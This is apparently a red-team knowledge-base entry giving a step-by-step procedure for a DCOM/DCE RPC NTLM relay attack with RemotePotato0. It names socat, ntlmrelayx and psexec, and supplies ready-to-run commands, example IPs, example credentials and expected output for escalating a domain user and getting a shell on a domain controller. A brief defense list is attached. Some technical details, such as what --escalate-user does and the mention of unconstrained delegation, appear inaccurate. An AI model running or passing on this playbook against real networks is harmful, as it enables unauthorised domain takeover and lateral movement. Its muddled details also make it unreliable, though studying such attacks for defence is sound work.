---
id: 40149c48-19aa-49ea-81c6-de0ac402fe52
name: DCOM-DCE-RPC-Relay-using-RemotePotato0
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:05.617427+00:00'
updated_at: '2023-04-10T20:26:29.600599+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Exploitation for Credential Access|T1212 - Exploitation for
    Credential Access]]
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Man-in-the-Middle attacks & relaying]]'
  - '[[tags/RemotePotato0 DCOM DCE RPC relay]]'
commands:
  - '[[commands/socat-tcp-listener-for-dcom-relay]]'
  - '[[commands/ntlmrelayx-ldap-escalate-user]]'
  - '[[commands/remote-potato0-dcom-relay-execution]]'
  - '[[commands/impacket-psexec-remote-execution]]'
platforms:
  - Windows
tools:
  - '[[tools/Socat]]'
  - '[[tools/Impacket]]'
  - '[[tools/RemotePotato0]]'
validated: true
---

# DCOM-DCE-RPC-Relay-using-RemotePotato0

## Summary

This procedure demonstrates how to perform a DCOM DCE RPC relay attack using RemotePotato0 to escalate privileges and execute code on a target Windows system via NTLM relay. It involves setting up a TCP forwarder, relaying NTLM authentication to LDAP for user escalation, triggering the relay with RemotePotato0 on a session, and finally executing a remote shell using the escalated credentials.

## Description

In this attack, an attacker positions themselves to intercept NTLM authentication traffic and relays it to a target Domain Controller's LDAP service to escalate a low-privilege user to higher privileges. RemotePotato0 exploits the DCOM/RPC activation mechanism on Windows to force the target to connect back through the relayed authentication, allowing arbitrary code execution. This is effective in Active Directory environments where unconstrained delegation or vulnerable RPC configurations exist. The target environment is a Windows domain with accessible DCs and workstations running Windows Server 2016 or later (socat step optional for older versions). Success leads to lateral movement and potential domain admin access.

## Requirements

1. Attacker machine with network access to the target domain (e.g., via compromised workstation at 192.168.83.130).
2. Target Domain Controller (e.g., 192.168.83.135) with LDAP accessible and vulnerable to relay.
3. Low-privilege domain user credentials (e.g., winrm_user_1:Password123!) for initial relay setup.
4. Tools: [[tools/Socat]] for TCP forwarding, [[tools/Impacket]] for NTLM relay and psexec, [[tools/RemotePotato0]] for DCOM triggering.
5. Run on a Linux attacker machine (Kali recommended) with Python 3 and required dependencies.

## Defense

- Implement network segmentation to limit the attack surface and block unauthorized RPC/DCOM traffic.
- Ensure that DCOM DCE RPC service is properly configured and secured, disabling unnecessary RPC endpoints.
- Use strong authentication mechanisms such as multi-factor authentication and constrain delegation policies.
- Enable Protected Users group and disable NTLM where possible, favoring Kerberos.
- Monitor for anomalous LDAP binds and RPC connections from unexpected sources.

## Objectives

1. Gain access to a target system by relaying NTLM authentication.
2. Execute arbitrary code on the target system using escalated privileges.
3. Move laterally within a network to compromise additional systems.

## Instructions

### Step 1: Setup TCP Listener for DCOM Relay

**Context**: Forward incoming DCOM/RPC connections on port 135 to a local relay port (9998) to capture and redirect authentication traffic. This step is optional for Windows Server 2016 and earlier but required for newer versions to handle RPC activation.

**Command** ([[commands/socat-tcp-listener-for-dcom-relay]]):
```bash
sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:$_LOCAL_RELAY_IP:$_RELAY_PORT &
```

> This command starts a background TCP proxy listening on port 135 (standard RPC endpoint) and forwards connections to the specified relay IP and port. Replace $_LOCAL_RELAY_IP with the attacker's relay machine IP (e.g., 192.168.83.131) and $_RELAY_PORT with 9998. Expected output is a confirmation that socat is listening; no errors indicate success. Verify with netstat or similar to confirm the listener is active.

### Step 2: Initiate NTLM Relay to LDAP for User Escalation

**Context**: Start the NTLM relay server using Impacket's ntlmrelayx to intercept authentication and relay it to the target LDAP server, escalating the relayed user (e.g., winrm_user_1) to higher privileges without WCF server interaction.

**Command** ([[commands/ntlmrelayx-ldap-escalate-user]]):
```bash
sudo ntlmrelayx.py -t ldap://$_TARGET_DC_IP --no-wcf-server --escalate-user $_TARGET_USER
```

> Run this on the attacker machine to listen for NTLM auth and relay to the Domain Controller's LDAP (e.g., $_TARGET_DC_IP=192.168.83.135, $_TARGET_USER=winrm_user_1). The --no-wcf-server flag avoids Windows Remote Management dependencies, and --escalate-user adds the relayed user to the Remote Desktop Users group for shell access. Expected output includes relay server startup messages like "NTLMRelayXServer started on 0.0.0.0:80". Wait for incoming connections to trigger the relay.

### Step 3: Trigger DCOM Relay Execution with RemotePotato0

**Context**: On a session 0 process (e.g., via scheduled task or service), execute RemotePotato0 to force the target machine to authenticate to the relay listener, completing the NTLM relay and privilege escalation.

**Command** ([[commands/remote-potato0-dcom-relay-execution]]):
```bash
RemotePotato0.exe -r $_RELAY_IP -p $_RELAY_PORT -s $_SESSION_ID
```

> Execute this on the target workstation (e.g., 192.168.83.130) in session 0, with $_RELAY_IP as the relay machine (192.168.83.131), $_RELAY_PORT=9998, and $_SESSION_ID=2 (or appropriate session). This triggers a DCOM activation that sends NTLM auth to the relay. Expected output is success messages from RemotePotato0 indicating connection and relay initiation. Monitor the ntlmrelayx output for successful escalation.

### Step 4: Execute Remote Shell with Escalated Credentials

**Context**: Use the escalated user credentials obtained from the relay to connect and execute a remote shell on the target DC, achieving code execution and lateral movement.

**Command** ([[commands/impacket-psexec-remote-execution]]):
```bash
psexec.py '$_DOMAIN/$_ESCALATED_USER:$_PASSWORD@$_TARGET_DC_IP'
```

> With the escalated credentials (e.g., LAB/winrm_user_1:Password123!, $_TARGET_DC_IP=192.168.83.135), this launches a semi-interactive shell on the target. Expected output includes a command prompt on the remote system (e.g., "C:\Windows\system32> "), confirming access. If successful, you can run commands like whoami to verify privileges.
